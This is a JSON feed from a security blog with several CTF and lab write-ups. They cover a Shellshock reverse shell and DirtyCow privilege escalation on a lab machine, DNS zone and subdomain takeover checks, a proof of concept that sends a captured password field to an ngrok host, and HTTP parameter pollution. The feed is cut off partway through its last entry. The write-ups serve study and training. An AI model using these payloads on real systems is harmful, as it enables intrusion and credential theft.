{"version":"https://jsonfeed.org/version/1.1","title":"./khatta.sh","home_page_url":"https://blog.shameerkashif.me","feed_url":"https://blog.shameerkashif.me/feed.json","description":"Khatta is a knowledge base and is created to provide in depth articles regarding tech, CTFs, challenges and much more.","icon":"https://blog.shameerkashif.me/assets/any@512.png","favicon":"https://blog.shameerkashif.me/favicon.png","authors":[{"name":"@hash3liZer","url":"https://blog.shameerkashif.me","avatar":"/assets/avatar.png"}],"language":"zh","hubs":[{"type":"WebSub","url":"https://pubsubhubbub.appspot.com"},{"type":"WebSub","url":"https://bridgy-fed.superfeedr.com"}],"items":[{"id":"blog/2023/amateursctf-web-2023-writeup-sanity","url":"https://blog.shameerkashif.me/blog/2023/amateursctf-web-2023-writeup-sanity","title":"Web Sanity Writeup AmateursCTF 2023 DOM Clobbering and Prototype Pollution","content_html":"<h2 id=\"introduction\"><a href=\"#introduction\">Introduction</a></h2><p>In the AmateursCTF 2023, there was a challenge by the name <code>Sanity</code>. Now, i wasn’t able to solve the challenge within the due time as i got stuck on the very last step of my Proof of Concept. Neverthless, i feel like writing the writeup for this one. Besides from CTF perspective, it covers vulnerabilities that can can be discovered in the wild on Internet. </p><h2 id=\"surface\"><a href=\"#surface\">Surface</a></h2><p>Coming soon…</p>","summary":"A complete writeup of sanity web challenge from AmateursCTF 2023. It covers the use of the Sanitizer API in browsers, DOM Clobbering, Parameter Pollution and XSS.","image":"https://github.com/hash3liZer/khatta/assets/29171692/755e47ec-8f67-45e9-a7cb-04efe7584127","date_published":"2023-07-21T00:00:00.000Z","date_modified":"2023-07-22T02:07:08.791Z","_indieweb":{"type":"article"}},{"id":"blog/2023/pgrounds/sumo-easy-writeup","url":"https://blog.shameerkashif.me/blog/2023/pgrounds/sumo-easy-writeup","title":"Writeup for Lab SUMO (Proving Grounds","content_html":"<h2 id=\"introduction\"><a href=\"#introduction\">Introduction</a></h2><p>Sumo is a machine available on vulnhub and offsec proving grounds labeled <strong>easy</strong> and covers 0-day exploits discovered in the past. The machine hosts a website and has 2 flags to be submitted. </p><h2 id=\"recon\"><a href=\"#recon\">Recon</a></h2><p>After getting the IP of the machine, ran a basic nmap scan on the target machine: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>nmap -Pn -sV -T4 192.168.1.48</div></code></div></pre><!-- HTML_TAG_END --><p>The disovered open ports are <code>80</code> and <code>22</code>. Lets visit the website first. </p><p>Next thing, i brute forced into the website using <code>dirsearch</code>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>python3 dirsearch --url https://192.168.1.120</div></code></div></pre><!-- HTML_TAG_END --><p>I found the <code>CGI-BIN</code> endpoint. And from the nmap output, we know the version of apache is <code>2.2.22</code> which is quite an old version.</p><h2 id=\"exploitation\"><a href=\"#exploitation\">Exploitation</a></h2><h3 id=\"initial-access\"><a href=\"#initial-access\">Initial Access</a></h3><p>Now, duringthe brute force phase, i also discovered the <code>test</code> script under the <code>CGI-BIN</code> folder. Since, we know the system is old, lets try the famous <code>ShellShock</code> exploit: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>curl -H ‘User-Agent: () &#123; :; &#125;; whoami; pwd; pwd’ http://192.168.124.87/cgi-bin/test.sh</div></code></div></pre><!-- HTML_TAG_END --><p>And we got the output back. Lets escalate it to a shell: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>## Listening</div><div class='line'>nc -lvnp 555</div><div class='line'></div><div class='line'>## Target execution</div><div class='line'>curl -H ‘User-Agent: () &#123; :; &#125;; /bin/bash -i &gt;& /dev/tcp/&lt;IP&gt;/555 0&gt;&1’ http://192.168.XX.XX/cgi-bin/test.sh</div></code></div></pre><!-- HTML_TAG_END --><p>And we got the shell. Our first flag is in <code>local.txt</code> file:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>cat ./local.txt</div></code></div></pre><!-- HTML_TAG_END --><h3 id=\"privilege-escalation\"><a href=\"#privilege-escalation\">Privilege Escalation</a></h3><p>Next, we need to escalate it to the root user. So, we can get the other flag as well. Lets get the system version first: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>hostnamectl  ## Game me no output</div><div class='line'>uname -a</div></code></div></pre><!-- HTML_TAG_END --><p>Hmmm, the linux version seems to be quite old. Now, just like before, the local exploit that came quickly to mind after the shellshoch was <code>dirtycow</code>. Lets get a public version of it. Compiling it: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>gcc dirtycow.c -o dcow -pthread -static</div></code></div></pre><!-- HTML_TAG_END --><p>I used the <code>-static</code> flag to statically compile the glibc libraries with the binary. Otherwise, you would run into the libraries issue since the system was quite old and i was on <code>Kali 2023.1</code>. Lets execute the binary: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>chmod +x ./dcow</div><div class='line'>./dcow</div></code></div></pre><!-- HTML_TAG_END -->","summary":"This is the writeup for sumo lab from proving grounds","date_published":"2023-07-20T00:00:00.000Z","date_modified":"2023-07-22T02:07:08.791Z","_indieweb":{"type":"article"}},{"id":"blog/2023/subrake-a-dns-automated-scanner","url":"https://blog.shameerkashif.me/blog/2023/subrake-a-dns-automated-scanner","title":"A Guide to Zone Transfer, DNS Zone Takeover and Subdomain Takeover","content_html":"<h2 id=\"introduction\"><a href=\"#introduction\">Introduction</a></h2><p>DNS have been there for years now to help you find things normally you wouldn’t remember. In this guide, we will go through the following set of problems that a third party can find and take advantage of in negative terms:</p><ul><li>DNS Zone Transfer</li><li>Subdomain Takeover</li><li>DNS Zone Transfer</li></ul><h2 id=\"subrake\"><a href=\"#subrake\">Subrake</a></h2><p>The primary reason i wrote this blog post was this project i am working on: <a href=\"https://github.com/hash3liZer/Subrake\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">Subrake</a>. It’s an automated DNS scanner to cover various issues in a single go. Let me know what you think about it in the comment section…</p><h2 id=\"explanation\"><a href=\"#explanation\">Explanation</a></h2><h3 id=\"zone-transfer\"><a href=\"#zone-transfer\">Zone Transfer</a></h3><p>Zone Transfer itself is not a vulnerability and is a procedure followed to transfer the records of a domain from one DNS server to another. For example, you need to replicate the records of your domain available in <code>namecheap</code> to AWS <code>Route53</code>.</p><p>In a Zone transfer, the dns server sends a complete dns records file to another server. The file contains everything the DNS server has regarding that domain including its <code>A</code>, <code>AAAA</code>, <code>CNAME</code>, and <code>SOA</code> records. This includes the information which publicly isn’t accessible. </p><p>For example, you can’t access the <code>CNAME</code> records of any domain without having to brute force your way into it. But if the DNS server itself is offering the service, kaboom. </p><p>Most of the pople in industry are already aware of Zone transfer, so lets directly jump to the part <strong>How to find it?</strong>. There are many tools available in the wild to find <code>zone transfer</code>. But the famous and the most simple one is <code>dig</code>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>dig zonetransfer.me -t AXFR +nocookie @dns_address</div></code></div></pre><!-- HTML_TAG_END --><ul><li>The <code>-t AXFR</code> option is a type of query to request zone transfer details.</li><li>The <code>+nocookie</code> option would disable the use of DNS cookies.</li><li>And additionally, you can specify <code>@dns_server</code> which can be skipped to use default DNS servers. I would highly recommend this option if you a playing a CTF or inside a network where a private DNS server is accessible.</li></ul><p>If successfull, this would list all the DNS records. This can also be accomplished using <code>subrake -d zonetransfer.me</code> and you would get: </p><img width=\"828\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/e0552efd-45d1-41fc-ad00-63706be3849a\"><h3 id=\"subdomain-takeover\"><a href=\"#subdomain-takeover\">Subdomain Takeover</a></h3><p>Subdomain Takeover unlike it sounds is actually the takeover of the service that subdomain is pointing to. Lets say <code>marketing.domain.tld</code> was pointing to an Amazon <code>S3</code> bucket or <code>ELastic Beanstalk</code> service which actually didn’t exist. </p><p>A third party can come and claim this service. Now what happens is that the party that claimed the service can host whatever they want on that subdomain but that ofcourse is limited to what the service has to offer. </p><p>Most of the people in industry have been creating their automations of this. Some use their own tools and some have sort of created a workflow. </p><p>You can go for a <code>oneliner</code>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>subfinder -d HOST &gt;&gt; FILE; assetfinder --subs-only HOST &gt;&gt; FILE; amass enum -norecursive -noalts -d HOST &gt;&gt; FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 &gt;&gt; takeover ; </div></code></div></pre><!-- HTML_TAG_END --><p>Or you can find the subdomains first using different tools and public sources and probably use a tool to check the takeover. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>python3 sublist3r.py -d target.com</div><div class='line'>amass enum -d target.com</div><div class='line'>...</div></code></div></pre><!-- HTML_TAG_END --><p>Checking the takeover: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>subrake -d target.com -w ./finalwordlists.txt</div></code></div></pre><!-- HTML_TAG_END --><img width=\"828\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/ce1559b0-e5fe-4fdc-ae2c-98de252c9970\"><p>The list of services that are currently known to vulnerable to Subdomain Takeover can be found at: <strong><a href=\"https://github.com/EdOverflow/can-i-take-over-xyz\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">Can I Takeover XYZ</a></strong></p><h3 id=\"dns-zone-takeover\"><a href=\"#dns-zone-takeover\">DNS Zone Takeover</a></h3><p>Zone Takeover is a term not too old right now and its actually is as it sounds unlike subdomain takeover. And it can be more <strong>severe</strong> as you have the control over the complete zone. In order words, you can host your own <code>records</code> and are not limited to the service being used like subdomain takeover. </p><p>The normal procedure that is being followed or atleast i follow this:</p><ul><li>I purchase the domain from namecheap or godaddy.</li><li>I create a new <code>Hosted Zone</code> in AWS <code>Route53</code> service.</li><li>The hosted zone gives me a set of nameservers.</li><li>I enter these nameservers into the Authoritative nameservers section in GoDaddy or namecheap.</li><li>Then i use the <code>Route53</code> service instead of GoDaddy or Namecheap to manage the records like <code>A</code>, <code>AAAA</code>, or <code>CNAME</code>. </li></ul><p>Infact, if you ever worked with <strong>Cloudflare</strong>, you would know that you create a new website in Cloudflare. In result you get the nameservers. You then set the <code>nameservers</code> with the domain you purchased. </p><p>After doing so, you <em>add/edit/remove</em> the records within the cloudflare panel. Lets suppose, after a year you plan to not use the Cloudflare service anymore. So, you delete your website from cloudflare but doesn’t actually remove the authoritative entries in your domain settings from godaddy. </p><p>Since the nameserver entries already exist and still pointing to the service (aka cloudflare in this case), a third party can claim the service which would lead to <strong>zone takeover</strong>. </p><p>If you understand the above scenario, you can relate it to the subdomain takeover where you claim the stale service. But here, its the stale zone. </p><h4 id=\"finding-zone-takeover\"><a href=\"#finding-zone-takeover\">Finding Zone Takeover</a></h4><p>The good thing with zone takeover is you don’t have to brute force your way into it or find anything publicly. The information is already there, you just have to make sure its in the right condition. </p><p>The first step would be to get the nameservers of the domain. We can use <code>dig</code> for that: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>dig shameerkashif.me +trace +all</div></code></div></pre><!-- HTML_TAG_END --><p>Or you can directly get the <code>NS</code> records and start looking from there. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>dig shameerkashif.me NS</div></code></div></pre><!-- HTML_TAG_END --><img width=\"894\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/aba8e709-0b33-486a-ac5c-c0ab48264625\"><p>The against each NS record, check if any of them fails to responsd. If it does, it can probably be vulnerable to zone takeover. The case it failes, you will have the status as <strong>REFUSED</strong> or <strong>SERVFAIL</strong>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>dig shameerkashif.me @ns1.digitalocean.com</div></code></div></pre><!-- HTML_TAG_END --><p>You can also check for <code>SOA</code> which is what i would like to do instead (to be more concise): </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>dig shameerkashif.me @ns1.digitalocean.com SOA</div></code></div></pre><!-- HTML_TAG_END --><p>Well, if it doesn’t responsd, you can try to claim the service. As of now, the current vulnerable services are available at: <a href=\"https://github.com/indianajson/can-i-take-over-dns\" rel=\"nofollow noopener noreferrer external\" target=\"_blank\">Can I Takeover DNS</a></p><p>Well, with subrake, it first tries to resolve each nameserver and if it does then it tries to guess the service and tells if its vulnerable or not. Something like this: </p><img width=\"743\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/3d55e662-c019-4062-8c46-4c9075c47a8e\"><h2 id=\"using-subrake\"><a href=\"#using-subrake\">Using Subrake</a></h2><p>Subrake can help you pick all 3 above cases. The complete information and details can be found at the link i mentioned in the start of this blog. I am simply attaching a screenshot with the details. </p><img src=\"https://user-images.githubusercontent.com/29171692/250178751-75abd71e-7765-4da0-8b08-1cc5e1e069c7.png\"><h2 id=\"conclusion\"><a href=\"#conclusion\">Conclusion</a></h2><p>First of all, i hope this guide was helpful 😅. We saw 3 different cases namely, Zone Transfer, Zone Takeover and Subdomain Takeover. The mitigation simply is to be aware of when you remove a service. Make sure the entries in your DNS gets updated as well. Or wrap the service completely.</p>","summary":"In this guide, we will be looking over vulnerabilites associated with a domain normally occured due to the negligence from the develper team. The terms we will see are Zone Transfer, DNS Zone Takeover and Subdomain Takeover.","image":"https://github.com/hash3liZer/khatta/assets/29171692/755e47ec-8f67-45e9-a7cb-04efe7584127","date_published":"2023-06-30T00:00:00.000Z","date_modified":"2023-07-22T02:07:08.791Z","tags":["dns-zone-takeover","dns-zone-transfer","subdomain-takeover","bugbounty","infosec","reconnaissance","automated-tool"],"_indieweb":{"type":"article"}},{"id":"blog/2023/writeup-browselicious-challenge-bsidestlv-ctf","url":"https://blog.shameerkashif.me/blog/2023/writeup-browselicious-challenge-bsidestlv-ctf","title":"BSidesTLV CTF 2023 Browselicious (Misc) Writeup","content_html":"<h1 id=\"introducton\"><a href=\"#introducton\">Introducton</a></h1><p>This writeup is for the <strong>Browselicious</strong> challenge from <strong>Misc</strong> category in BSidesTLV CTF held online. The challenge had an external link and a <code>js</code> file that contained browser extension code. The external link was a simple website that had a URL Input field. The URL was probably being processed in a browser on the backend with the extension installed.</p><p>To complete the challenge, one had to create a document with a <code>input[type=&quot;password&quot;]</code> field and capture the value of this field when populated by the extension itself. But also, we needed to exploit a race condition here by doing a <code>postMessage</code> before the extension itself.</p><h1 id=\"writeup\"><a href=\"#writeup\">Writeup</a></h1><h3 id=\"server-request\"><a href=\"#server-request\">Server Request</a></h3><p>Right after i visited the page, it said <em>Our Extension is coming soon</em> and there was an input field that accepted a URL. So, right away i fired up <code>ngrok</code> without actually running anything for the proxy and checked if i received anything back.</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>$ ngrok http 8000</div></code></div></pre><!-- HTML_TAG_END --><p>And i got requests back on terminal.</p><img width=\"946\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/ba40787f-c811-46ec-93a5-1a67298d9a28\"><h3 id=\"code-review\"><a href=\"#code-review\">Code Review</a></h3><p>Then i opened the <code>js</code> file and the code has 2 main events: <code>onMessage</code> and <code>onLoad</code>. The first event checks for a couple conditions and populates data in the <code>input[type=&quot;password&quot;]</code> field. The second event simply fires a <code>postMessage</code> to the current window with some data. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>// Listen for messages from the extension</div><div class='line'>window.addEventListener(\"message\", function (event) &#123;</div><div class='line'>    // Check if the message is from the extension</div><div class='line'>    if (event.source === window && event.data.action === \"populatePassword\") &#123;</div><div class='line'>        // Find the password input field</div><div class='line'>        var passwordField = document.querySelector('input[type=\"password\"]');</div><div class='line'></div><div class='line'>        // Populate the password field with the specified string</div><div class='line'>        if (passwordField) &#123;</div><div class='line'>            passwordField.value = (event.data.url === \"http://flag\") ? \"BSidevTLV2023&#123;TheFlag&#125;\" : \"MyDefaultPassword\";</div><div class='line'>        &#125;</div><div class='line'>    &#125;</div><div class='line'>&#125;);</div><div class='line'></div><div class='line'>// Send a message to populate the password field on page load</div><div class='line'>window.addEventListener(\"load\", function () &#123;</div><div class='line'>    window.postMessage(&#123;</div><div class='line'>        action: \"populatePassword\",</div><div class='line'>        url: window.location.href,</div><div class='line'>        password: \"YourPassword\" // Replace with the desired password</div><div class='line'>    &#125;, \"*\");</div><div class='line'>&#125;);</div></code></div></pre><!-- HTML_TAG_END --><h3 id=\"exploit\"><a href=\"#exploit\">Exploit</a></h3><p>To exploit the challenge, we need to implement 3 things in the PoC:</p><ul><li>Create a web page with <code>input[type=&quot;password&quot;]</code> form field which will accept the data.</li><li>Exploit the Race condition by setting an interval in <em>milliseconds</em>.</li><li>In the <code>postMessage</code>, set the value of <code>url</code> to <code>http://flag</code>.</li></ul><p>Before we head to the exploit work, setup a <code>python</code> file to act as our server: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>import http.server</div><div class='line'>import socketserver</div><div class='line'></div><div class='line'>PORT = 8000</div><div class='line'></div><div class='line'>html_content = r'''</div><div class='line'>PAYLOAD HERE</div><div class='line'>'''</div><div class='line'></div><div class='line'># Request Handler</div><div class='line'>class MyHandler(http.server.BaseHTTPRequestHandler):</div><div class='line'>    def do_GET(self):</div><div class='line'>        self.send_response(200)</div><div class='line'>        self.send_header('Content-type', 'text/html')</div><div class='line'>        self.end_headers()</div><div class='line'>        self.wfile.write(html_content.encode('utf-8'))</div><div class='line'></div><div class='line'>with socketserver.TCPServer((\"0.0.0.0\", PORT), MyHandler) as httpd:</div><div class='line'>    print(f\"Serving at port &#123;PORT&#125;\")</div><div class='line'>    httpd.serve_forever()</div></code></div></pre><!-- HTML_TAG_END --><h4 id=\"input-field\"><a href=\"#input-field\">Input Field</a></h4><p>Put together an html code that as input field: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" html=\"true\"><div class=\"language-id\">html</div><div class='code-container'><code><div class='line'>&lt;!DOCTYPE html&gt;</div><div class='line'>&lt;html lang=\"en\"&gt;</div><div class='line'>&lt;head&gt;</div><div class='line'>    &lt;meta charset=\"utf-8\" /&gt;</div><div class='line'>    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /&gt;</div><div class='line'>    &lt;title&gt;POC Vulnerable website&lt;/title&gt;</div><div class='line'>&lt;/head&gt;</div><div class='line'>&lt;body&gt;</div><div class='line'>    &lt;form&gt;</div><div class='line'>        &lt;input type=\"password\"&gt;&lt;/input&gt;</div><div class='line'>        &lt;script&gt;</div><div class='line'>          window.addEventListener('load', () =&gt; &#123;</div><div class='line'>                let elem = document.querySelector(\"input\");</div><div class='line'>                if(elem.value)&#123;</div><div class='line'>                    fetch(\"https://f5d4-101-50-76-194.ngrok-free.app/?value=\" + (elem.value || \"nothing\"));</div><div class='line'>                &#125;</div><div class='line'>            &#125;);</div><div class='line'>        &lt;/script&gt;</div><div class='line'>    &lt;/form&gt;</div><div class='line'>&lt;/body&gt;</div><div class='line'>&lt;/html&gt;</div></code></div></pre><!-- HTML_TAG_END --><p>I fired up this python server, proxied through ngrok:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>$ python3 poc.py</div></code></div></pre><!-- HTML_TAG_END --><p>Got, the following result:</p><img width=\"946\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/d267f5fa-f46e-4443-b43e-64f354a443dc\"><h4 id=\"race-condition\"><a href=\"#race-condition\">Race Condition</a></h4><p>To exploit the race condition, i simply replaced the <code>addEventListener</code> with <code>setInterval</code> having <code>20ms</code>. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>setInterval(() =&gt; &#123;</div><div class='line'>  let elem = document.querySelector(\"input\");</div><div class='line'>  if(elem.value)&#123;</div><div class='line'>      fetch(\"https://f5d4-101-50-76-194.ngrok-free.app/?value=\" + (elem.value || \"nothing\"));</div><div class='line'>  &#125;</div><div class='line'>&#125;, 20);</div></code></div></pre><!-- HTML_TAG_END --><h4 id=\"post-message\"><a href=\"#post-message\">Post Message</a></h4><p>Now, simply put the <code>postMessage</code> inside the callback function: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>setInterval(() =&gt; &#123;</div><div class='line'>  window.postMessage(&#123;</div><div class='line'>      action: \"populatePassword\",</div><div class='line'>      url: \"http://flag\",</div><div class='line'>      password: \"YourPassword\" // Replace with the desired password</div><div class='line'>  &#125;, \"*\");</div><div class='line'></div><div class='line'>  let elem = document.querySelector(\"input\");</div><div class='line'>  if(elem.value)&#123;</div><div class='line'>      fetch(\"https://f5d4-101-50-76-194.ngrok-free.app/?value=\" + (elem.value || \"nothing\"));</div><div class='line'>  &#125;</div><div class='line'>&#125;, 20);</div></code></div></pre><!-- HTML_TAG_END --><p>This time i fired up the server and got the flag:</p><img width=\"946\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/aaa3fa1b-1c7b-45d4-9745-4464d6dd1f4f\"><h2 id=\"poc\"><a href=\"#poc\">PoC</a></h2><p>The complete Proof of Concept:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>import http.server</div><div class='line'>import socketserver</div><div class='line'></div><div class='line'>PORT = 8000</div><div class='line'></div><div class='line'>html_content = r\"\"\"</div><div class='line'>&lt;!DOCTYPE html&gt;</div><div class='line'>&lt;html lang=\"en\"&gt;</div><div class='line'>&lt;head&gt;</div><div class='line'>    &lt;meta charset=\"utf-8\" /&gt;</div><div class='line'>    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /&gt;</div><div class='line'>    &lt;title&gt;POC Vulnerable website&lt;/title&gt;</div><div class='line'>&lt;/head&gt;</div><div class='line'>&lt;body&gt;</div><div class='line'>    &lt;form&gt;</div><div class='line'>        &lt;input type=\"password\"&gt;&lt;/input&gt;</div><div class='line'>    &lt;/form&gt;</div><div class='line'>    &lt;script&gt;</div><div class='line'>            setInterval(() =&gt; &#123;</div><div class='line'>                window.postMessage(&#123;</div><div class='line'>                    action: \"populatePassword\",</div><div class='line'>                    url: \"http://flag\",</div><div class='line'>                    password: \"YourPassword\" // Replace with the desired password</div><div class='line'>                &#125;, \"*\");</div><div class='line'></div><div class='line'>                let elem = document.querySelector(\"input\");</div><div class='line'>                if(elem.value)&#123;</div><div class='line'>                    fetch(\"https://f5d4-101-50-76-194.ngrok-free.app/?value=\" + (elem.value || \"nothing\"));</div><div class='line'>                &#125;</div><div class='line'>            &#125;, 20);</div><div class='line'>    &lt;/script&gt;</div><div class='line'>&lt;/body&gt;</div><div class='line'>&lt;/html&gt;</div><div class='line'>\"\"\"</div><div class='line'></div><div class='line'>class MyHandler(http.server.BaseHTTPRequestHandler):</div><div class='line'>    def do_GET(self):</div><div class='line'>        self.send_response(200)</div><div class='line'>        self.send_header('Content-type', 'text/html')</div><div class='line'>        self.end_headers()</div><div class='line'>        self.wfile.write(html_content.encode('utf-8'))</div><div class='line'></div><div class='line'>with socketserver.TCPServer((\"0.0.0.0\", PORT), MyHandler) as httpd:</div><div class='line'>    print(f\"Serving at port &#123;PORT&#125;\")</div><div class='line'>    httpd.serve_forever()</div></code></div></pre><!-- HTML_TAG_END -->","summary":"Writeup for Browselicious challenge (Misc) from BsidesTLV CTF 2023","image":"https://github.com/hash3liZer/khatta/assets/29171692/1788ec87-fc59-49a7-a035-ec767504fb3d","date_published":"2023-06-28T00:00:00.000Z","date_modified":"2023-07-22T02:07:08.791Z","tags":["ctf","writeups","bsidestlv-ctf-2023"],"_indieweb":{"type":"article"}},{"id":"blog/2023/writeup-under-construction-google-ctf-2023","url":"https://blog.shameerkashif.me/blog/2023/writeup-under-construction-google-ctf-2023","title":"Google CTF 2023 Under Construction (Web) Writeup","content_html":"<h1 id=\"introduction\"><a href=\"#introduction\">Introduction</a></h1><p>This writeup is for the under construction challenge from web category in Google CTF 2023. The challenge was provided with the following statement: <em>“We were building a web app but the new CEO wants it remade in php.”</em></p><p>The challenge contained 2 different web apps. One was in PHP that seems to be under development whilst flask app seemed like a full application. This writeup covers an <code>Parameter Pollution</code> vulnerability we were able to create an escalated user by supplying more than 1 parameter. </p><h1 id=\"writeup\"><a href=\"#writeup\">Writeup</a></h1><h2 id=\"getting-started\"><a href=\"#getting-started\">Getting Started</a></h2><p>So, at first i visited the URLS and got to know the application surface. Then i downloaded the challenge files available and opened them in the editor. </p><p>Reading the code, i got to the <code>flag</code> point. In the <code>index.php</code> file, we have: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" php=\"true\"><div class=\"language-id\">php</div><div class='code-container'><code><div class='line'>...</div><div class='line'>if ($tier === NULL) &#123;</div><div class='line'>    return \"Invalid credentials\";</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>$response = \"Login successful. Welcome \" . htmlspecialchars($username) . \".\";</div><div class='line'></div><div class='line'>// Look at this part. </div><div class='line'>if ($tier === \"gold\") &#123;</div><div class='line'>    $response .= \" \" . getenv(\"FLAG\");</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>return $response;</div><div class='line'></div><div class='line'>...</div></code></div></pre><!-- HTML_TAG_END --><p>So, in order to get the flag, we need to create a gold tier user first. The PHP application itself doesn’t offer any signup functionlaity but the <code>account_migrator.php</code> file does that is being called from the flask application. So, if we look at the flask application, we will find where the user is being registered. </p><h2 id=\"vulnerable-part\"><a href=\"#vulnerable-part\">Vulnerable Part</a></h2><p>In the <code>authorized_routes.py</code>, we have: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>...</div><div class='line'>@authorized.route('/signup', methods=['POST'])</div><div class='line'>def signup_post():</div><div class='line'>  ...</div><div class='line'>  tier = models.Tier(request.form.get('tier'))</div><div class='line'></div><div class='line'>  if(tier == models.Tier.GOLD):</div><div class='line'>      flash('GOLD tier only allowed for the CEO')</div><div class='line'>      return redirect(url_for('authorized.signup'))  # Validation is based on first parameter</div><div class='line'>  ...</div><div class='line'></div><div class='line'>  new_user = models.User(username=username, </div><div class='line'>  password=generate_password_hash(password, method='sha256'), tier=tier.name)</div><div class='line'>  </div><div class='line'>  db.session.add(new_user)</div><div class='line'>  db.session.commit()</div><div class='line'>  </div><div class='line'>  requests.post(f\"http://&#123;PHP_HOST&#125;:1337/account_migrator.php\", </div><div class='line'>      headers=&#123;\"token\": TOKEN, \"content-type\": request.headers.get(\"content-type\")&#125;, data=raw_request) # Vulnerable PART</div><div class='line'>  return redirect(url_for('authorized.login'))</div></code></div></pre><!-- HTML_TAG_END --><p>The validation is based on the statement: <code>request.form.get(&#39;tier&#39;)</code>. This will always pick the first parameter if multiple parameters are to be supplied. However, the application is passing the <code>raw_request</code> as it is to the next application which is in PHP. </p><p>Take the following example:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'># Flask</div><div class='line'>curl https://vulnerablepart.com?tier=gold&tier=blue</div><div class='line'># you will the first parameter aka gold.</div><div class='line'></div><div class='line'># PHP</div><div class='line'>curl http://vulnerablepart.com?tier=gold&tier=bold</div><div class='line'># you will get the second parameter aka bold</div></code></div></pre><!-- HTML_TAG_END --><h2 id=\"exploit\"><a href=\"#exploit\">Exploit</a></h2><p>In order to exploit this, we needed to create the user normally but with extra argument containing <code>gold</code> value. I simply signed up with the following request in Burp: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>POST /signup HTTP/2</div><div class='line'>Host: under-construction-web.2023.ctfcompetition.com</div><div class='line'>Upgrade-Insecure-Requests: 1</div><div class='line'>Origin: https://under-construction-web.2023.ctfcompetition.com</div><div class='line'>Content-Type: application/x-www-form-urlencoded</div><div class='line'>User-Agent: &lt;Redacted&gt;</div><div class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</div><div class='line'></div><div class='line'>username=hash3liZer&password=password&tier=blue&tier=gold</div></code></div></pre><!-- HTML_TAG_END --><p>And it took me back to login page to signin:</p><img width=\"962\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta.sh/assets/29171692/e898c72f-b040-49d5-8f1b-4d07b40c24b3\"><p>So, i went to the PHP application and logged in and got the flag:</p><img width=\"1440\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta.sh/assets/29171692/c6f61468-a875-4656-bd77-7c63190ee67f\"><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>CTF&#123;ff79e2741f21abd77dc48f17bab64c3d&#125;</div></code></div></pre><!-- HTML_TAG_END -->","summary":"Writeup for under construction challenge from google ctf 